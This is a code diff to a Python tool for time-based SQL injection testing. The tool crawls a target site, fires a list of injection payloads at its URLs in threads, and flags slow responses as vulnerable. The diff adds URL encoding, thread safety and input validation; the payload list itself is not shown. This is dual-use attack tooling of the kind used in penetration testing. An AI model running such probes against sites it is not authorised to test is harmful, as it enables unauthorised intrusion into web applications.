@@ -1,7 +1,7 @@
 import requests
 import argparse
 import time
-from urllib.parse import urljoin, urlparse, parse_qs
+from urllib.parse import urljoin, urlparse, parse_qs, quote
 from bs4 import BeautifulSoup
 import threading
 import sqlite3
@@ -63,34 +63,43 @@ class TimeBasedSQLiTester:
     def __init__(self, config):
         self.config = config
         self.results = []
+        self.lock = threading.Lock()
 
     def test_payload(self, url, payload):
         try:
+            encoded_payload = quote(payload)  # Ensure payload is URL encoded
+            full_url = url + encoded_payload
             start_time = time.time()
-            r = requests.get(url + payload, cookies=self.config.cookies, headers={'User-Agent': self.config.user_agent}, proxies=self.config.proxies, timeout=self.config.timeout)
+            r = requests.get(full_url, cookies=self.config.cookies, headers={'User-Agent': self.config.user_agent}, proxies=self.config.proxies, timeout=self.config.timeout)
             response_time = time.time() - start_time
-            if response_time > self.config.sleep_time:
-                vulnerable = True
-            else:
-                vulnerable = False
-            self.results.append({
-                'url': url,
-                'payload': payload,
-                'vulnerable': vulnerable,
-                'response_time': response_time,
-                'status_code': r.status_code,
-                'content_length': len(r.content)
-            })
+            vulnerable = response_time > self.config.sleep_time
+            
+            with self.lock:  # Ensure thread-safe access to shared data
+                self.results.append({
+                    'url': url,
+                    'payload': payload,
+                    'vulnerable': vulnerable,
+                    'response_time': response_time,
+                    'status_code': r.status_code,
+                    'content_length': len(r.content)
+                })
         except requests.exceptions.RequestException as e:
             print(f"Request to {url + payload} failed: {e}")
+        except Exception as e:
+            print(f"An error occurred: {e}")
 
     def run(self):
         urls_to_test = [self.config.url] if not self.config.crawl else self.crawl(self.config.url)
         for url in urls_to_test:
+            threads = []
             for payload in TIME_BASED_XOR_PAYLOADS:
                 thread = threading.Thread(target=self.test_payload, args=(url, payload))
+                threads.append(thread)
                 thread.start()
-                thread.join(self.config.delay)
+                time.sleep(self.config.delay)  # Delay between starting threads
+
+            for thread in threads:
+                thread.join()
 
     def crawl(self, base_url):
         urls = set([base_url])
@@ -136,7 +145,6 @@ class TimeBasedSQLiTester:
         return list(urls)
 
     def extract_js_urls(self, js_code, base_url):
-        # Regex to find URLs in JavaScript
         js_urls = set()
         url_patterns = re.findall(r"""(https?://[^\s'"]+|[^\s'"]+/\w+\.php\?\w+=\w+)""", js_code)
         for pattern in url_patterns:
@@ -149,7 +157,7 @@ class TimeBasedSQLiTester:
         url_parts = list(urlparse(url))
         query = dict(parse_qs(url_parts[4]))
         query.update(params)
-        url_parts[4] = '&'.join([f"{key}={value}" for key, value in query.items()])
+        url_parts[4] = '&'.join([f"{key}={quote(value)}" for key, value in query.items()])  # URL encode the query parameters
         return urljoin(url, url_parts[2] + '?' + url_parts[4])
 
     def display_results(self):
@@ -205,6 +213,12 @@ class Config:
         self.generate_json = args.generate_json
         self.generate_html = args.generate_html
 
+    def validate(self):
+        # Basic URL validation
+        parsed_url = urlparse(self.url)
+        if not parsed_url.scheme or not parsed_url.netloc:
+            raise ValueError("Invalid URL format")
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Advanced Time-Based SQL Injection Testing Tool")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
@@ -219,6 +233,12 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     config = Config(args)
-    tester = TimeBasedSQLiTester(config)
-    tester.run()
-    tester.display_results()
+    try:
+        config.validate()  # Validate inputs
+        tester = TimeBasedSQLiTester(config)
+        tester.run()
+        tester.display_results()
+    except ValueError as ve:
+        print(f"Input validation error: {ve}")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
